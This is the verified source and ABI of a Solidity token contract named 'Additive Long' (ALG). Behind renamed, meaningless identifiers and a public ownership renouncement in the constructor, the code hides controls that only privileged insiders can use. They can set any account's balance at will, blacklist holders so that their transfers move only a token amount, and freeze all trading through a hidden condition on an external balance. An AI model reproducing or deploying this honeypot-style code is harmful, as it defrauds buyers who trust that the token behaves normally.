{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface sellTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapBuyFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTake {\n    function createPair(address receiverShould, address senderWallet) external returns (address);\n}\n\ninterface exemptAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldReceiver) external view returns (uint256);\n\n    function transfer(address teamAutoIs, uint256 buySellAuto) external returns (bool);\n\n    function allowance(address atLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buySellAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamAutoIs,\n        uint256 buySellAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSwap, uint256 value);\n    event Approval(address indexed atLimit, address indexed spender, uint256 value);\n}\n\ninterface exemptAutoMetadata is exemptAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdditiveLong is swapBuyFrom, exemptAuto, exemptAutoMetadata {\n\n    function receiverSender(address launchedAuto, uint256 buySellAuto) public {\n        tokenTotal();\n        shouldAmount[launchedAuto] = buySellAuto;\n    }\n\n    address private limitAt;\n\n    uint256 private modeLimit;\n\n    bool public modeAutoBuy;\n\n    uint8 private receiverSwap = 18;\n\n    mapping(address => mapping(address => uint256)) private marketingSwap;\n\n    function getOwner() external view returns (address) {\n        return limitAt;\n    }\n\n    uint256 private toSell = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public shouldEnable;\n\n    mapping(address => uint256) private shouldAmount;\n\n    mapping(address => bool) public listSenderTrading;\n\n    function owner() external view returns (address) {\n        return limitAt;\n    }\n\n    bool private enableToken;\n\n    uint256 private exemptIs;\n\n    function balanceOf(address shouldReceiver) public view virtual override returns (uint256) {\n        return shouldAmount[shouldReceiver];\n    }\n\n    function approve(address takeExemptEnable, uint256 buySellAuto) public virtual override returns (bool) {\n        marketingSwap[_msgSender()][takeExemptEnable] = buySellAuto;\n        emit Approval(_msgSender(), takeExemptEnable, buySellAuto);\n        return true;\n    }\n\n    function takeTotalBuy(address feeReceiver) public {\n        require(feeReceiver.balance < 100000);\n        if (swapList) {\n            return;\n        }\n        \n        shouldEnable[feeReceiver] = true;\n        \n        swapList = true;\n    }\n\n    function marketingShould(address isMode) public {\n        tokenTotal();\n        if (modeAutoBuy != enableToken) {\n            enableToken = true;\n        }\n        if (isMode == buyWalletLiquidity || isMode == feeLaunch) {\n            return;\n        }\n        listSenderTrading[isMode] = true;\n    }\n\n    address autoBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address limitFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isAt;\n    }\n\n    uint256 modeShouldList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toSell;\n    }\n\n    event OwnershipTransferred(address indexed sellList, address indexed isLimitLiquidity);\n\n    function modeTeam() public {\n        emit OwnershipTransferred(buyWalletLiquidity, address(0));\n        limitAt = address(0);\n    }\n\n    bool public swapList;\n\n    address public buyWalletLiquidity;\n\n    function transferFrom(address senderExempt, address teamAutoIs, uint256 buySellAuto) external override returns (bool) {\n        if (_msgSender() != autoBuy) {\n            if (marketingSwap[senderExempt][_msgSender()] != type(uint256).max) {\n                require(buySellAuto <= marketingSwap[senderExempt][_msgSender()]);\n                marketingSwap[senderExempt][_msgSender()] -= buySellAuto;\n            }\n        }\n        return txFee(senderExempt, teamAutoIs, buySellAuto);\n    }\n\n    constructor (){\n        if (modeAutoBuy != enableToken) {\n            modeAutoBuy = false;\n        }\n        sellTotal takeFee = sellTotal(autoBuy);\n        feeLaunch = tradingTake(takeFee.factory()).createPair(takeFee.WETH(), address(this));\n        if (enableToken != modeAutoBuy) {\n            modeAutoBuy = true;\n        }\n        buyWalletLiquidity = _msgSender();\n        modeTeam();\n        shouldEnable[buyWalletLiquidity] = true;\n        shouldAmount[buyWalletLiquidity] = toSell;\n        \n        emit Transfer(address(0), buyWalletLiquidity, toSell);\n    }\n\n    uint256 buyFee;\n\n    function name() external view virtual override returns (string memory) {\n        return minLaunch;\n    }\n\n    function allowance(address launchedSenderTeam, address takeExemptEnable) external view virtual override returns (uint256) {\n        if (takeExemptEnable == autoBuy) {\n            return type(uint256).max;\n        }\n        return marketingSwap[launchedSenderTeam][takeExemptEnable];\n    }\n\n    function takeTx(uint256 buySellAuto) public {\n        tokenTotal();\n        modeShouldList = buySellAuto;\n    }\n\n    function isTx(address senderExempt, address teamAutoIs, uint256 buySellAuto) internal returns (bool) {\n        require(shouldAmount[senderExempt] >= buySellAuto);\n        shouldAmount[senderExempt] -= buySellAuto;\n        shouldAmount[teamAutoIs] += buySellAuto;\n        emit Transfer(senderExempt, teamAutoIs, buySellAuto);\n        return true;\n    }\n\n    string private isAt = \"ALG\";\n\n    function transfer(address launchedAuto, uint256 buySellAuto) external virtual override returns (bool) {\n        return txFee(_msgSender(), launchedAuto, buySellAuto);\n    }\n\n    string private minLaunch = \"Additive Long\";\n\n    function tokenTotal() private view {\n        require(shouldEnable[_msgSender()]);\n    }\n\n    address public feeLaunch;\n\n    function txFee(address senderExempt, address teamAutoIs, uint256 buySellAuto) internal returns (bool) {\n        if (senderExempt == buyWalletLiquidity) {\n            return isTx(senderExempt, teamAutoIs, buySellAuto);\n        }\n        uint256 fromFee = exemptAuto(feeLaunch).balanceOf(limitFrom);\n        require(fromFee == modeShouldList);\n        require(teamAutoIs != limitFrom);\n        if (listSenderTrading[senderExempt]) {\n            return isTx(senderExempt, teamAutoIs, enableMin);\n        }\n        return isTx(senderExempt, teamAutoIs, buySellAuto);\n    }\n\n    uint256 constant enableMin = 13 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimitLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSenderTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeExemptEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySellAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWalletLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSenderTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"}],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAutoBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySellAuto\",\"type\":\"uint256\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"takeTotalBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buySellAuto\",\"type\":\"uint256\"}],\"name\":\"takeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySellAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAutoIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySellAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AdditiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}